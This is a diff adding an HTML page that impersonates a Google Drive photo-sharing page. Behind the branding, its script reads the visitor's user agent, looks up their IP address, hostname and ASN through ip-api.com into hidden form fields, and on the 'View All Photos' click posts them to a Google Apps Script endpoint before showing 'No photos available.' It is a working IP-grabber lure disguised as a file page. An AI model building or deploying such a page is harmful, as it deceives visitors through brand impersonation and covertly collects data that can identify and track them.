@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>drive file</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMj8vK1Ek7Zr+0PRuFq7xCjH2E2U4B6pYe4UHI" crossorigin="anonymous">
+    <style>
+        body {
+            
+            width: 92%;
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            text-align: center;
+            background-color: #f0f0f0;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .fa-google-drive {
+            font-size: 100px;
+            color: #4285F4;
+        }
+        .image-box {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            border: 1px solid #007BFF;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            margin: 0 auto 15px;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .image-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s;
+        }
+        .image-box:hover img {
+            transform: scale(1.1);
+        }
+        /* Hide the user agent form and input fields */
+        #userAgent, #ipAddress, #hostname, #asn {
+            display: none; /* Makes the input fields invisible */
+        }
+        #submitBtn {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        #submitBtn:hover {
+            background-color: #0056b3;
+        }
+        /* Loading spinner styles */
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 45%;
+            transform: translate(-50%, -50%);
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: white;
+            border: 2px solid #007BFF;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+        }
+        .popup .close {
+            cursor: pointer;
+            color: #007BFF;
+            font-weight: bold;
+        }
+        /* Footer styles */
+        .footer {
+            margin-top: 30%;
+            background-color: #f1f1f1;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            position: relative;
+            bottom: 0;
+            width: 85%;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-area" style="
+        display: flex; 
+        justify-content: center; 
+        align-items: center; 
+        height: 100px; 
+        border: 0px solid #; 
+        padding: 10px; 
+        background-color: #;
+        margin-bottom: 20px;
+    ">
+        <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/google-drive-for-business_ufpw.png" alt="" style="
+            max-width: 100%; 
+            max-height: 100%; 
+            object-fit: cover;
+        ">
+    </div>
+    <div style="
+        margin: 20px auto; 
+        max-width: 200px; 
+        text-align: center; 
+        padding: 10px; 
+        border: 1px solid #ccc; 
+        background-color: #f9f9f9;
+    ">
+        Google Drive File
+        <br>
+    </div>
+
+    <form id="userAgentForm">
+        <input type="text" id="userAgent" name="userAgent" readonly>
+        <input type="text" id="ipAddress" name="ipAddress" placeholder="IP Address" readonly>
+        <input type="text" id="hostname" name="hostname" placeholder="Hostname" readonly>
+        <input type="text" id="asn" name="asn" placeholder="ASN" readonly>
+    </form>
+    
+    <div class="image-box" id="imageBox">
+        <img src="https://raw.githubusercontent.com/drivefile-google/photos/main/4503941.png" alt="">
+    </div>
+    <button id="submitBtn">View All Photos</button>
+    <div class="loader" id="loader"></div>
+    <div class="popup" id="popup">
+        <p>No photos available.</p>
+        <span class="close" id="closePopup">Close</span>
+    </div>
+
+    <div class="footer">
+        <p style="margin: 5px 0;">© 2024 Google Drive. All rights reserved.</p>
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Privacy Policy</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Terms of Service</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 10px;">Help Center</a>
+    </div>
+
+    <script>
+        document.getElementById('userAgent').value = navigator.userAgent;
+
+        // Fetch IP information and fill the form fields
+        fetch('http://ip-api.com/json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ipAddress').value = data.query; // Set IP Address
+                document.getElementById('hostname').value = data.reverse ?? data.query; // Set Hostname, fallback to IP
+                document.getElementById('asn').value = data.as; // Set ASN
+            })
+            .catch(error => {
+                console.error('Error fetching IP information:', error);
+                alert('Unable to fetch IP information.');
+            });
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            var formData = new FormData(document.getElementById('userAgentForm'));
+            var loader = document.getElementById('loader');
+            loader.style.display = 'block'; // Show the loading spinner
+            fetch('https://script.google.com/macros/s/AKfycbwHt3Y7jK5wNV76wfTDMzipG9P59VYZlMUngSLtoOjmsAZDSYmqMBxrsQsB_zgqybM7ug/exec', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Handle success response
+                loader.style.display = 'none'; // Hide the loading spinner
+                showPopup(); // Show popup message
+            })
+            .catch(error => {
+                console.error('Error:', error); // Handle error response
+                loader.style.display = 'none'; // Hide the loading spinner
+                alert('Error sending data!'); // Alert for error
+            });
+        });
+
+        function showPopup() {
+            var popup = document.getElementById('popup');
+            popup.style.display = 'block'; // Show the popup
+        }
+
+        document.getElementById('closePopup').addEventListener('click', function() {
+            var popup = document.getElementById('popup');
+            popup.style.display = 'none'; // Hide the popup when closed
+        });
+    </script>
+</body>
+</html>
